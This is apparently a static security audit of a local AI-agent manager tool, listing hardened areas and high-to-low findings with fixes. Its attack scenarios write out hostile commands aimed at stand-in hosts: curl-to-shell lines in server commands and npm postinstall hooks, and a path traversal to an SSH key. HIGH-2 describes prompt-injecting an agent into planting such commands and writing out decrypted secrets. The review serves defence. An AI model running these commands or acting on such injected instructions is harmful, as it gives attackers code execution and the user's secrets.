# Security Review — agent-manager

**Reviewer facet:** Security posture — secrets handling, injection, auth, crypto, least-privilege
**Scope:** `src/` at `/Users/baladita/Documents/DevBox/agent-manager` as of 2026-04-16
**Method:** Static read of crypto, spawn sites, HTTP server, auth middleware, marketplace/adapter installer paths, path-traversal boundaries, logging surface.

## Summary

agent-manager has clearly received **meaningful security hardening** — AES-256-GCM with random nonces, timing-safe bearer comparison, `parseCommand` array-form spawns (no shell), strict agent-name allowlist on the bridge entrypoint, SHA-256 checksum verification for community adapters, redaction of `enc:v1:` values in both MCP and web config responses, and an opt-in tool-tier permission model for MCP. The obvious high-impact classes (shell injection via `sh -c`, timing oracle on bearer, default auto-approve bypass) are addressed.

However, several meaningful gaps remain — some structural, some one-step-removed from a trivial exploit:

- **The AES key is not derived from a passphrase or KDF.** It is a raw 256-bit key stored in a plaintext file inside a directory that is, by design, frequently checked into a user's personal git remote (GitLab/GitHub). The file is written 0o600 but there is nothing that prevents it from being committed if placed inside a tracked path, and the key lives next to the ciphertext it protects.
- **`commitAll` stages every file in the config dir** (including `.agent-manager/key.txt` if it isn't in `.gitignore`) and then pushes it on `am_sync_push` — the key and ciphertext travel together unless the user has correctly gitignored the key.
- **`am mcp-serve` has no auth at all** — any local process that can read stdin/stdout of the MCP server (or any agent that has it configured) can execute `write-local` tools including `am_apply`, which writes files into adapter config directories outside the am config dir.
- **Community adapters and ACP agents resolved from user config are spawned without any allowlist, sandbox, or signature check** once registered. A malicious adapter registered once runs on every `am` invocation that loads adapters.
- **Marketplace clones arbitrary git URLs with depth=1 and executes `npm install`** implicitly via adapter install path. A hostile repo can run a lifecycle script during install.
- **Path-traversal on the marketplace `plugin.name` field**: `applyPlugin` joins `plugin.pluginDir` with `skillPath` from the manifest without validation; a manifest with `"../../etc"` paths will resolve outside the plugin dir.
- **A2A server has no CORS, no body size limit, no rate limit, no HTTPS enforcement.** Acceptable for localhost but dangerous if the user binds to a LAN interface or reverse-proxies it without adding those in front.
- **Bearer token for the web dashboard is permanent and cannot be rotated without deleting the file** — no rotation command, no TTL, no revocation.

Net: a locally-trusted, single-user tool whose threat model is coherent for its stated use case, with a non-trivial attack surface if any supply-chain trust assumption breaks (hostile adapter, hostile marketplace, hostile MCP server config entry).

**Score: 6.5 / 10** — thoughtful baseline, no low-hanging critical, but KDF/gitignore/auth-on-mcp gaps keep it out of the 8+ range.

---

## CRITICAL findings

None identified. The worst items (shell injection on ACP terminal, agent-name RCE on bridge) have already been remediated.

---

## HIGH findings

### HIGH-1 — AES-256-GCM master key stored raw next to ciphertext; no KDF; trivially committed to git

**File:** `src/core/secrets.ts:29-50`, `src/commands/secret.ts:404-427` (generate-key), `src/core/git.ts:26+` (`commitAll` stages all)

**Observation:**
- `loadKey()` reads `configDir/.agent-manager/key.txt` directly — this is a raw AES key base64-encoded, not a wrapped/derived key.
- No PBKDF2/scrypt/argon2 — there is no passphrase anywhere. Possession of the file = possession of all secrets.
- `saveKey` writes `mode: 0o600` (good), but the file lives at `~/.config/agent-manager/.agent-manager/key.txt` — the config dir is **the same directory** that `am` turns into a git repo via `am init` and auto-commits every change into.
- `commitAll` in `src/core/git.ts:26` calls `git.statusMatrix` and stages everything in the working tree (not restricted to tracked files) before each commit. There is no code that guarantees a `.gitignore` with `.agent-manager/key.txt` exists. If `am init` does not write such a `.gitignore` (the file `src/core/git.ts:initRepo` only writes an initial commit), the first `commitAll` after `generateKey` will include `key.txt`. Then `am_sync_push` pushes it to the user's git remote.
- `scan --fix` auto-creates the key on demand (`src/commands/secret.ts:344-349`) — the user is never prompted about the ramification.

**Attack scenario:**
1. User runs `am secret scan --fix` (or `am secret generate-key`), which creates `.agent-manager/key.txt` (0600).
2. User runs `am add server` or any write, which calls `commitAll`. If `.agent-manager/` is not gitignored, `key.txt` is staged and committed.
3. User runs `am sync push` (or `am_sync_push` via MCP). The private AES key is pushed to GitLab/GitHub in plaintext alongside the ciphertext values it encrypts.
4. Anyone with read access to the remote has all decrypted secrets.

**Fix direction:**
- Write `.gitignore` containing `.agent-manager/key.txt` during `am init` and during `generate-key` if no repo yet.
- Change `commitAll` to refuse staging any file matching a hardcoded sensitive path list (`**/key.txt`, `**/*.pem`, `**/.env`) regardless of `.gitignore`.
- Long-term: derive the key from a passphrase via scrypt/argon2 and store only the KDF salt + algorithm, or integrate with the OS keychain (macOS `security`, Linux `libsecret`, Windows DPAPI).

Severity rationale: this is the plaintext key next to the plaintext ciphertext in a directory the tool itself pushes to a remote. It is not CRITICAL only because the mode 0o600 and the fact that `initRepo` may be writing a gitignore we did not confirm exists means it is an easy user-error rather than a guaranteed exfiltration.

---

### HIGH-2 — `am mcp-serve` exposes `write-local` tools (including `am_apply`) with no authentication

**File:** `src/mcp/server.ts:107-129` (checkPermission), `src/mcp/server.ts:1700+` (McpServer.serve)

**Observation:**
- The MCP server runs over stdio and implements three tiers: `read-only`, `write-local`, `write-remote`.
- `checkPermission` **always returns `{ allowed: true }` for `read-only` and `write-local`** (lines 112-114). Only `write-remote` requires `settings.mcp_serve.allow_push`.
- `write-local` includes: `am_add_server`, `am_remove_server`, `am_server_update`, `am_undo`, `am_use_profile`, `am_import`, `am_registry_install`, `am_apply`, `am_wiki_add`, `am_wiki_harvest`, `am_acp_list_agents` (spawns agents on tools/list? — no, only on `am_run_agent`).
- **`am_apply` is mis-tiered as `write-local` (line 1097)** despite its description stating "WARNING: writes files outside the am config directory." `am_apply` decrypts all secrets with the encryption key (lines 1102-1105) and writes them into `~/.claude.json`, Cursor config, Gemini config, etc.
- Any AI agent that has `am mcp-serve` plumbed into its MCP config (Claude Code, Cursor, etc.) — even a lower-trust adapter — can call `am_apply` with no opt-in, which will decrypt and write secrets.

**Attack scenario:**
An attacker who can prompt-inject an agent that has `am mcp-serve` configured can:
1. Call `am_registry_install` with attacker-controlled package name (no prompt to user).
2. Call `am_add_server` with `command = "curl attacker.com/rce | sh"` and `env = {OPENAI_API_KEY: "…"}`.
3. Call `am_apply` to materialize the malicious command into the user's Claude Code / Cursor config.
4. Next time the user's agent runs, it spawns the attacker command with real env secrets.

**Fix direction:**
- Reclassify `am_apply` as `write-remote` (it writes outside the config dir) or add a new `write-materialize` tier.
- Require an opt-in (`settings.mcp_serve.allow_write_local = true`) for write-local tools, defaulting to deny.
- At minimum: log every write-local call with the tool name + arg summary to a dedicated audit log in `configDir`.

---

### HIGH-3 — `am mcp-serve` has no rate-limit or input-size cap on JSON-RPC

**File:** `src/mcp/server.ts:1856-1898` (serve loop)

**Observation:**
- The serve loop reads from stdin and buffers until newline. No limit on buffer size (`buffer += decoder.decode(chunk, ...)` grows indefinitely).
- `JSON.parse(line)` on an arbitrarily large line is a DoS vector. Batch requests (`Array.isArray(req)`) fan out to `Promise.all` with no concurrency bound.

**Attack scenario:**
A compromised agent or a misbehaving client sends a 2 GB single line of garbage, OOMing `am mcp-serve`. Or sends a batch of 10,000 `tools/call` for `am_apply` to thrash the disk.

**Fix direction:**
- Cap `buffer.length` at ~4 MiB and reject/truncate beyond that.
- Cap batch size at 32 (the MCP spec does not require unlimited batching).
- Add a simple in-process rate limit (e.g. 60 calls / 60s per method).

---

### HIGH-4 — Marketplace installer executes `applyPlugin` with `path.join(pluginDir, skillPath)` — path traversal into host FS

**File:** `src/marketplace/installer.ts:140-157` (skill path), `src/marketplace/installer.ts:114-136` (servers from manifest)

**Observation:**
- `applyPlugin` receives `plugin.pluginDir` (trusted — from the marketplace scan) and `manifest.skills: string[]` (untrusted — from `plugin.json` in a cloned git repo).
- Line 145: `path: join(plugin.pluginDir, skillPath)`. If `skillPath = "../../../etc/passwd"` or `"/etc/passwd"`, `path.join` does NOT protect against absolute paths or traversal that escapes `pluginDir`.
- The resulting skill is persisted into `config.toml` as `skill.path`. Later, `am_apply` or `am_session_export` may load content from that path, turning arbitrary-file-read into config exfiltration.
- Similarly, `server.command` (line 119) is taken verbatim from `serverDef.command` — a hostile marketplace can inject commands that will be run by downstream tools after `am apply`.

**Attack scenario:**
1. Attacker publishes a marketplace plugin with `plugin.json` containing `"skills": ["../../../../home/user/.ssh/id_rsa"]`.
2. User runs `am install attacker-plugin` — `applyPlugin` writes `skill.path = "<pluginDir>/../../../../home/user/.ssh/id_rsa"` into config.toml.
3. When Claude Code adapter exports skills, or any consumer reads the skill file, SSH private key content is emitted.

Also applies to server.command: `"command": "/bin/sh", "args": ["-c", "curl evil | sh"]` — but that at least requires the user to `am apply` and then run an agent.

**Fix direction:**
- In `applyPlugin`: resolve `join(pluginDir, skillPath)` and verify the result `startsWith(resolve(pluginDir) + sep)`.
- Reject manifest skill paths with `..`, absolute paths, or that resolve outside `pluginDir`.
- Apply the same `isPathAllowed` helper that `src/protocols/acp/client.ts:337` already defines.

---

### HIGH-5 — Adapter install runs `npm install` on cloned git repos — arbitrary code execution via lifecycle scripts

**File:** `src/commands/adapter.ts:153-168`

**Observation:**
- Git source flow:
  1. `Bun.spawn(["git", "clone", url, name], { cwd: adaptersDir })` — OK, array form, user confirmed `--force` optional.
  2. `Bun.spawn(["npm", "install", "--production"], { cwd: adapterDir })` — runs the cloned repo's `preinstall`/`install`/`postinstall` scripts.
- npm defaults to running lifecycle scripts. Unless the user has `npm config set ignore-scripts true`, a malicious `package.json` in the cloned repo runs arbitrary code as the user.
- Same applies to the npm source path at line 142 and the update path at line 310.

**Attack scenario:**
`am adapter install https://evil.tld/am-adapter-hostile.git` — clone succeeds, `npm install` runs attacker's `"postinstall": "curl evil.tld/rce.sh | sh"`, achieving RCE before checksum verification (which happens at load time via `loadCommunityAdapters`, not at install time).

**Fix direction:**
- Pass `--ignore-scripts` to npm: `["npm", "install", "--production", "--ignore-scripts"]`.
- Warn the user before install: "Installing an adapter runs the adapter binary in-process. Only install from sources you trust."
- Document that `npm install` lifecycle is disabled and that adapters must work with the published tarball only.

---

### HIGH-6 — ACP agent `command` from config is spawned verbatim with `parseCommand` — command-injection via config override

**File:** `src/protocols/acp/client.ts:112-125` (`connect`), `src/protocols/acp/registry.ts:44-46` (config override path), `src/core/agent-registry.ts:119-127`

**Observation:**
- `parseCommand` splits on `/\s+/` — it is **not a shell parser**. It does NOT interpret metacharacters or quoting.
- Safe against shell-metachar injection (the whole point of HIGH-2 earlier fix).
- BUT: `config.agents.<name>.acp.command` is taken from the user's config TOML. If an attacker can write to that TOML (e.g. via HIGH-4 marketplace plugin injecting agent definitions, or HIGH-2 MCP writing to config), they can set `command = "/bin/curl https://evil | bash"`. Since `parseCommand` does NOT reject absolute paths or require an allowlist, the attacker-chosen executable is spawned on the next `am run <name>`.

**Attack scenario:**
Chained with HIGH-4: a marketplace plugin sets `config.agents.claude.acp.command = "/bin/bash"` and `args = ["-c", "exfil; real-claude-agent"]`. User's next `am run claude "help"` runs attacker code.

**Fix direction:**
- Validate that config-override commands resolve to an executable the user explicitly added (prompt on first use).
- Consider disallowing `agents.*.acp.command` in marketplace-installed plugins entirely (only the user's hand-edited TOML may define ACP commands).
- Display a warning before first spawn: "Agent X will run command Y — continue? [y/N]".

---

### HIGH-7 — Bearer token for web dashboard is permanent; no rotation, no TTL

**File:** `src/web/server.ts:35-54`

**Observation:**
- `ensureAuthToken` generates once and persists to `web-token.txt` (mode 0600).
- There is no command to rotate it, no TTL, no revocation. If the token leaks (e.g. into a browser extension, terminal scrollback, shell history after `curl -H "Authorization: Bearer $TOK"`), the only remediation is `rm web-token.txt`, which is not documented.
- `safeTokenCompare` is used in A2A server but `/api/*` in `src/web/server.ts:108` uses `token !== authToken` (plain `!==`). This is a timing leak, though in practice localhost-only mitigates it substantially.

**Fix direction:**
- Use `safeTokenCompare` from A2A in web middleware too.
- Provide `am web rotate-token` command.
- Document "if your token leaks, delete `web-token.txt` and restart `am serve`".

---

## MEDIUM findings

### MEDIUM-1 — `redactSecrets` only catches `enc:v1:` strings; unencrypted secrets in config are returned in cleartext by `am_config_show` and `/api/config`

**File:** `src/mcp/server.ts:133-140`, `src/web/server.ts:65-76`

**Observation:**
- Redaction key logic: `if (typeof obj === "string" && obj.startsWith("enc:v1:")) return "[encrypted]";`
- If a user has set `env.OPENAI_API_KEY = "sk-proj-…"` in cleartext (never encrypted, e.g. because they skipped `am secret scan --fix`), it will be returned verbatim by `am_config_show` and `/api/config`.
- There is a secret-scanner (`scanConfigForSecrets`) available at doctor-time but the redaction path doesn't use it — it only checks for the `enc:v1:` prefix.

**Fix direction:**
- In the redaction helper, also redact values whose key matches `SECRET_KEY_PATTERNS` from `core/secret-detection.ts`.
- Or: gate `am_config_show` and `/api/config` behind a stricter permission (or require `?reveal=true` + extra token).

---

### MEDIUM-2 — `scan --fix` writes the decrypted original value into `config.settings.env[envVar]` via `encryptValue` but the pre-substitution value may have already been committed to git

**File:** `src/commands/secret.ts:355-377`

**Observation:**
- `substituteSecret` rewrites `server.env[key]` to `${VAR}`, then `config.settings.env[envVar] = encryptValue(secret.value, key)`.
- But if the original plaintext secret was already committed (e.g. user added a server with a plaintext token and ran `am add server` before running `am secret scan --fix`), the plaintext is in git history forever.
- There is no `git filter-repo` style cleanup, and no warning when `scan --fix` detects values that have already been committed.

**Fix direction:**
- After `scan --fix`, detect which of the substituted values are present in `git log -p` and warn:
  "N secrets were previously committed to git at <SHA>. Run `git filter-repo` or rotate these credentials."

---

### MEDIUM-3 — `CommunityAdapterProxy.call` times out at 30s but has no ceiling on in-flight pending requests

**File:** `src/adapters/community/proxy.ts:121-149`

**Observation:**
- `pendingRequests` Map grows unbounded if an adapter stops reading. Each request adds a timer.
- A slow or hostile adapter that accepts stdin but never writes to stdout eventually exhausts node-timers / memory.

**Fix direction:**
- Cap `pendingRequests.size` at e.g. 64; reject new calls until drained.

---

### MEDIUM-4 — A2A server accepts unbounded JSON body; no `bodyLimit`; no CORS

**File:** `src/protocols/a2a/server.ts:616-715` (POST /a2a), `src/web/server.ts` (Hono app)

**Observation:**
- `await c.req.json()` — Hono does not enforce a body size limit by default when using `req.json()`.
- No CORS middleware. If the user ever exposes the A2A server (bridge mode) on a port reachable from a browser, any origin could POST tasks (though with bearer auth, only drive-by requests from a page that has the token leaked).
- No limit on `history` size beyond `MAX_HISTORY_PER_TASK = 100`, but a single `TaskSendParams.message` with megabytes of text inflates every stored task.

**Fix direction:**
- Add `bodyLimit` middleware with e.g. 1 MiB cap.
- Add explicit `Access-Control-Allow-Origin: null` (or restrictive allowlist) to refuse browser calls.

---

### MEDIUM-5 — `isPathAllowed` check in ACP client is bypassed when `allowedPaths.length === 0`

**File:** `src/protocols/acp/client.ts:388-411`

**Observation:**
- `readTextFile` and `writeTextFile` only enforce the path check if `allowedPaths.length > 0`. The default `allowedPaths` on `AmAcpClient` is `[]` (line 77). Callers must explicitly `setAllowedPaths([cwd])` or pass `opts.allowedPaths`.
- `src/commands/run.ts:133` calls `client.connect(entry.acp.command, { initTimeout: 30_000 })` — **no allowedPaths passed, so the spawned agent can read/write anywhere the user can**.
- Comment on line 99-100 acknowledges this: "Default: [] (unrestricted — for backwards compatibility; callers should set [cwd])."

**Fix direction:**
- Default `allowedPaths` to `[cwd]` when a `cwd` is provided to `newSession`.
- Require opt-in for unrestricted file access (`--unsafe-fs` or similar flag).

---

### MEDIUM-6 — Checksum verification on community adapters is opt-in (warning, not error, when absent)

**File:** `src/adapters/community/loader.ts:26-36`

**Observation:**
- `verifyChecksum` emits a `console.error("warning: ...")` and returns when `storedChecksum` is undefined, **then the adapter is spawned anyway**.
- `am adapter install` in `src/commands/adapter.ts` does NOT record a checksum at install time (`CommunityAdapterConfig` is written without `checksum` — see `src/commands/adapter.ts:190-195`).
- Net: the checksum field exists in the type but is almost never populated in practice. Adapters installed via `am adapter install` are verified only on their first install, never again.

**Fix direction:**
- At install time, compute SHA256 of `command` (the binary path) and persist it in `adapters.toml`.
- Turn the warning into a hard error when `strict_checksums = true` in settings.
- Provide `am adapter pin <name>` to refresh the pinned checksum after a trusted update.

---

### MEDIUM-7 — `am install` invokes `npm install <pkg>` via `Bun.spawn` without `--ignore-scripts` on update path too

**File:** `src/commands/adapter.ts:310-314`

Same class as HIGH-5 — the update path also runs lifecycle scripts. Separate finding because it affects previously-trusted adapters on updates.

---

### MEDIUM-8 — Marketplace `clone` does not verify host or certificate pinning; `isomorphic-git` relies on Node TLS defaults

**File:** `src/marketplace/client.ts:92-112`

**Observation:**
- `git.clone({ url, depth: 1 })` — any URL, including `http://` (no TLS). `detectSource` only sets a source label; it does not reject insecure schemes.
- `local:` path symlinks (line 91) point to arbitrary directories; if `resolvedUrl` is a sensitive directory, scans later read files from it.

**Fix direction:**
- Reject `http://` URLs unless `--insecure` flag is set.
- Whitelist known-good hosts by default (`github.com`, `gitlab.com`, `gitlab.aws.dev`, etc.).

---

### MEDIUM-9 — `startTask` handler runs user-supplied command synchronously into `defaultTaskHandler`, which does not validate payload sizes

**File:** `src/protocols/a2a/server.ts:391-441`

**Observation:**
- `task.history.push(params.message)` — `params.message` is arbitrary user-supplied JSON. A malicious A2A client can send a `message.parts[].text` of 100 MB. Capped later by `MAX_HISTORY_PER_TASK = 100` entries but not by per-message size.
- A 100 MB × 100 history cap = 10 GB per task. Combined with MAX_TASKS = 1000 = 10 TB theoretical.

**Fix direction:**
- Cap total message size at e.g. 64 KiB before accepting.

---

### MEDIUM-10 — `generateKey` output is printed to stdout in cleartext with `info("Save this key ...: ${base64}")`

**File:** `src/commands/secret.ts:420-421`

**Observation:**
- The key is echoed to the terminal. It lands in shell scrollback, terminal multiplexer logs (`screen -L`, `tmux` capture buffers), and any tool recording the session (asciinema, Claude Code session recordings).
- Given this is an AES master key, this is a meaningful exposure.

**Fix direction:**
- Do not print the key by default. Print the file path and recommend `cat` redirection to a password manager.
- Or require `--show-key` flag.

---

## LOW / Informational

### LOW-1 — Community adapter command path is stored relative to `configDir` but resolved as an absolute command at spawn time
`src/adapters/community/proxy.ts:61` — `Bun.spawn([this.command, ...])`. If `this.command` is a relative path, spawn resolves against the Bun process CWD, not the config dir. Unlikely in practice (install writes absolute paths at `src/commands/adapter.ts:151, 170`) but worth hardening.

### LOW-2 — `BUILT_IN_REGISTRY` in `src/protocols/acp/registry.ts:16-33` pins `npx ... @latest`
Using `@latest` in a spawn command means the first network-available version is run. A compromised npm registry or typosquat could substitute a malicious package. Pin to a specific version + checksum in a lockfile-style config.

### LOW-3 — `debug()` (src/lib/output.ts:30-32) never redacts anything
`debug("Resolved source: ...")` etc. never receive secret values, but if someone adds `debug(\`env: ${JSON.stringify(env)}\`)` later it silently leaks. Consider a wrapper that walks the string for `enc:v1:` and redacts.

### LOW-4 — `error()` always prefixes `error: `; secret values inside error messages are not redacted
E.g. `error(\`npm install failed: ${stderr}\`)` at `src/commands/adapter.ts:146` — npm error output can include auth URLs with tokens. Low probability but worth a `redactKnownSecretPatterns` helper.

### LOW-5 — `detectSource` in marketplace treats any URL containing "gitlab" as gitlab
`src/marketplace/client.ts:50` — `if (url.includes("gitlab")) return "gitlab"`. `https://evil.com/gitlab-fake.git` would be tagged as gitlab. Cosmetic only.

### LOW-6 — `setCommunityAdapterConfig` writes `adapters.toml` unencrypted; no signing
Any local process with write access to `configDir` can swap the `command` field and wait for the user to invoke an adapter. Expected for a user-only dir, but a hardening step would be HMAC-ing the TOML with the AES key.

### LOW-7 — `A2AClient.discoverAgent` fetches arbitrary URLs with no SSRF controls (`src/protocols/a2a/client.ts:57-80`)
A user who pastes an attacker URL into `am agent discover` can cause the tool to GET an internal metadata service (169.254.169.254, localhost:8080, etc.) Responses are JSON-parsed. Unlikely to lead to direct compromise but should reject private/link-local addresses by default.

### LOW-8 — `generateAgentCard` output is public (`/.well-known/agent.json`) and enumerates profile name, server names, adapter names
`src/protocols/a2a/server.ts:598-601` — No auth on the well-known endpoint (per A2A spec). Ensure no secret-ish names end up in server names. Fine for now but worth a note in docs.

### LOW-9 — `commitAll` uses fixed author `{name: "agent-manager", email: "am@localhost"}`
Not a vuln, but in multi-user systems this masks the actual user. Informational.

### LOW-10 — `am init` may or may not write `.gitignore`
Not verified in this review — if it does not, HIGH-1 is definitely exploitable by default. If it does, HIGH-1 remains for users who `am init` in an already-git-initialized directory.

---

## Threat Model Coverage

### In scope (treated as hostile)
- Malicious community adapter binary post-install (mitigated by checksum verification, partially).
- Malicious ACP agent subprocess (mitigated by `isPathAllowed`, partially, and `--no-auto-approve`).
- Shell metacharacter injection through agent command strings (mitigated by `parseCommand` + array-form spawn).
- Timing oracle on bearer token (mitigated by `safeTokenCompare` in A2A; NOT in web server, see HIGH-7 note).
- Bridge entrypoint RCE via unvalidated agent name (mitigated by `AGENT_NAME_RE` allowlist).

### Assumed trusted (out of scope)
- The local filesystem (anyone with the user's UID).
- `~/.config/agent-manager` directory integrity (no signing, no HMAC).
- The Claude Code / Cursor / IDE processes that consume `am apply` output.
- Network path to npm / GitHub / GitLab registries (no pinning beyond lockfile).
- The AES master key file as long as the user has sensible umask.

### Not well handled
- Supply-chain attacks on installed adapters (checksum optional, scripts run on install).
- Attacker with write access to the config TOML (can silently swap agent commands — see HIGH-6).
- Marketplace plugin manifest content (partial — name allowlist exists, but skill paths do not, see HIGH-4).
- Local processes sharing the user's UID (e.g., browser extension reading `web-token.txt` or `key.txt`).

---

## Recommendations (prioritized remediation order)

1. **(HIGH-1)** Ensure `.agent-manager/key.txt` is in `.gitignore` on every key generation. Add a hard refusal in `commitAll` if the key file is in the staging set. Document a migration path (`am secret rotate-key`) for users who already pushed their key.
2. **(HIGH-2)** Reclassify `am_apply` as `write-remote` (or new `write-materialize`) tier. Require opt-in for write-local via `settings.mcp_serve.allow_write_local = true`. Add an audit log.
3. **(HIGH-5, MEDIUM-7)** Add `--ignore-scripts` to every `npm install` invocation in `src/commands/adapter.ts`. Warn users at install time.
4. **(HIGH-4)** Add path-traversal guards in `applyPlugin` using the same `isPathAllowed` helper already present for ACP. Reject `..` and absolute paths in manifest fields.
5. **(HIGH-6)** Require explicit first-use approval when spawning an ACP agent whose `command` comes from `config.agents.<name>.acp` (not from `BUILT_IN_ACP_AGENTS`).
6. **(HIGH-3, MEDIUM-4, MEDIUM-9)** Add input-size limits to the MCP stdio loop (4 MiB/line), A2A HTTP body (1 MiB), and A2A message parts (64 KiB).
7. **(HIGH-7)** Switch web bearer compare to `safeTokenCompare`. Add `am web rotate-token` command.
8. **(MEDIUM-1)** Extend `redactSecrets` to also redact values whose keys match `SECRET_KEY_PATTERNS`, not just `enc:v1:` strings.
9. **(MEDIUM-5)** Default ACP client `allowedPaths` to `[cwd]` when `newSession({cwd})` is called. Require explicit `--unsafe-fs` to unset.
10. **(MEDIUM-6)** At `am adapter install` time, compute and persist SHA256 of the adapter binary. Make checksum absence a fatal error under `strict_checksums = true`.
11. **(MEDIUM-10)** Stop echoing the AES key to stdout in `am secret generate-key`.
12. **(LOW-2)** Pin built-in ACP agent versions; document the supply-chain trust boundary.
13. **(LOW-7)** Reject private/link-local/loopback targets in `discoverFromUrl` unless `--allow-local` is set.

---

## Appendix — Files reviewed

- `src/core/secrets.ts` — encrypt/decrypt, key load/save, interpolation
- `src/core/config.ts` — config load/merge, no secret handling bugs observed
- `src/core/secret-detection.ts` — tier-1 key-name scan
- `src/core/agent-registry.ts` — unified resolution (config > built-in > roster)
- `src/commands/secret.ts` — key generation (stdout leak), scan/fix flow
- `src/commands/adapter.ts` — install/update/remove, spawn sites, source resolution
- `src/commands/serve.ts`, `src/commands/run.ts`
- `src/mcp/server.ts` — tool tiers and permission check
- `src/web/server.ts` — auth middleware, bearer token, CRUD endpoints
- `src/protocols/a2a/server.ts` — JSON-RPC, SSE, bearer
- `src/protocols/a2a/client.ts` — discovery (SSRF-adjacent)
- `src/protocols/a2a/discovery.ts`
- `src/protocols/acp/client.ts` — subprocess spawn, path allowlist, permission policy
- `src/protocols/acp/registry.ts` — parseCommand, BUILT_IN_REGISTRY
- `src/protocols/acp/flows.ts` — action node spawn
- `src/protocols/bridge.ts` — A2A→ACP bridge, agent-name allowlist
- `src/adapters/community/proxy.ts` — JSON-RPC subprocess proxy
- `src/adapters/community/loader.ts` — checksum verification
- `src/marketplace/installer.ts` — applyPlugin (skill path traversal)
- `src/marketplace/client.ts` — clone
- `src/marketplace/scanner.ts` — manifest discovery
- `src/lib/output.ts` — debug/info/error logging
- `src/core/git.ts` — commitAll, push/pull
